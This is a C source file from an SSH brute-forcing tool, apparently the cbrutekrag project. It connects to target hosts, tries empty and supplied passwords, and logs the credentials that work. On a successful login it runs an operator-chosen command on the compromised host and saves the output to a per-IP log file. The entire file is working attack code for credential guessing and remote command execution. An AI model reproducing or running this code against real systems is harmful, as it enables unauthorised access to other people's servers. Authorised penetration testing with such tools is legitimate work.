/*
Copyright (c) 2014-2018 Jorge Matricali

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <arpa/inet.h>
#include <libssh/libssh.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "bruteforce_ssh.h"
#include "cbrutekrag.h"
#include "log.h"
#include "progressbar.h"

char* get_output_filename_for_session(ssh_session session)
{
    struct sockaddr_storage tmp;
    struct sockaddr_in* sock;
    unsigned int len = 100;
    char ip[100] = "\0";

    getpeername(ssh_get_fd(session), (struct sockaddr*)&tmp, &len);
    sock = (struct sockaddr_in*)&tmp;
    inet_ntop(AF_INET, &sock->sin_addr, ip, len);

    char* filename = malloc(strlen(ip) + 9); // _cmd.log + null-terminator

    if (filename == NULL) {
        exit(EXIT_FAILURE);
    }

    strcpy(filename, ip);
    strcat(filename, "_cmd.log");

    return filename;
}

FILE* get_output_file_for_session(ssh_session session)
{
    FILE* output = NULL;
    char* filename = get_output_filename_for_session(session);

    output = fopen(filename, "a");

    if (output == NULL) {
        log_error("Error opening output file. (%s)", filename);
        exit(EXIT_FAILURE);
    }

    free(filename);

    return output;
}

int bruteforce_ssh_login(btkg_context_t* context, const char* hostname, unsigned int port, const char* username,
    const char* password)
{
    ssh_session my_ssh_session;
    int verbosity = 0;

    if (context->verbose & CBRUTEKRAG_VERBOSE_SSHLIB) {
        verbosity = SSH_LOG_PROTOCOL;
    } else {
        verbosity = SSH_LOG_NOLOG;
    }

    my_ssh_session = ssh_new();

    if (my_ssh_session == NULL) {
        log_error("Cant create SSH session.");
        return -1;
    }

    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostname);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
#if LIBSSH_VERSION_MAYOR > 0 || (LIBSSH_VERSION_MAYOR == 0 && LIBSSH_VERSION_MINOR >= 6)
    ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, "none");
    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, "none");
#endif
    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &context->timeout);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);

    int r;
    r = ssh_connect(my_ssh_session);
    if (r != SSH_OK) {
        ssh_free(my_ssh_session);
        if (context->verbose & CBRUTEKRAG_VERBOSE_MODE) {
            log_error("[!] Error connecting to %s:%d %s.", hostname, port, ssh_get_error(my_ssh_session));
        }
        return -1;
    }

    r = ssh_userauth_none(my_ssh_session, username);
    if (r == SSH_AUTH_SUCCESS && context->command != NULL) {
        bruteforce_ssh_execute_command(my_ssh_session, context->command);
    }
    if (r == SSH_AUTH_SUCCESS || r == SSH_AUTH_ERROR) {
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return r;
    }

    int method = 0;

    method = ssh_userauth_list(my_ssh_session, NULL);

    if (method & SSH_AUTH_METHOD_NONE) {
        r = ssh_userauth_none(my_ssh_session, NULL);
        if (r == SSH_AUTH_SUCCESS) {
            if (context->command != NULL) {
                bruteforce_ssh_execute_command(my_ssh_session, context->command);
            }
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            return r;
        }
    }

    if (method & SSH_AUTH_METHOD_PASSWORD) {
        r = ssh_userauth_password(my_ssh_session, NULL, password);
        if (r == SSH_AUTH_SUCCESS) {
            if (context->command != NULL) {
                bruteforce_ssh_execute_command(my_ssh_session, context->command);
            }
            ssh_disconnect(my_ssh_session);
            ssh_free(my_ssh_session);
            return r;
        }
    }

    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    return -1;
}

int bruteforce_ssh_try_login(btkg_context_t* context, const char* hostname, const int port, const char* username,
    const char* password, int count, int total, FILE* output)
{
    int ret = bruteforce_ssh_login(context, hostname, port, username, password);

    if (ret == 0) {
        log_info("\033[32m[+]\033[0m %s:%d %s %s", hostname, port, username, password);
        if (output != NULL) {
            log_output(output, "\t%s:%d\t%s\t%s\n", hostname, port, username, password);
        }
    } else {
        log_debug("\033[38m[-]\033[0m %s:%d %s %s", hostname, port, username, password);
    }

    if (context->progress_bar) {
        char bar_suffix[50];
        sprintf(bar_suffix, "[%d] %s:%d %s %s", count, hostname, port, username, password);
        progressbar_render(count, total, bar_suffix, -1);
    }

    return ret;
}

int bruteforce_ssh_execute_command(ssh_session session, const char* command)
{
    ssh_channel channel;
    int ret;

    /** Create channel */

    channel = ssh_channel_new(session);

    if (channel == NULL) {
        return SSH_ERROR;
    }

    /** Open a session */

    ret = ssh_channel_open_session(channel);
    if (ret != SSH_OK) {
        log_error("Cannot open channel.");
        ssh_channel_free(channel);
        return ret;
    }

    /** Send command */

    ret = ssh_channel_request_exec(channel, command);
    if (ret != SSH_OK) {
        log_error("Cannot execute command.");
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return ret;
    }

    /** Read the output */

    FILE* output = NULL;
    char buffer[256];
    int nbytes;
    nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);

    output = get_output_file_for_session(session);

    while (nbytes > 0) {
        if (fwrite(buffer, 1, nbytes, output) != nbytes) {
            goto exit_with_errors;
        }
        nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
    }

    if (nbytes < 0) {
        goto exit_with_errors;
    }

    fclose(output);
    ssh_channel_close(channel);
    ssh_channel_free(channel);

    return ret;

exit_with_errors:
    if (output != NULL) {
        fclose(output);
    }
    ssh_channel_close(channel);
    ssh_channel_free(channel);

    return SSH_ERROR;
}
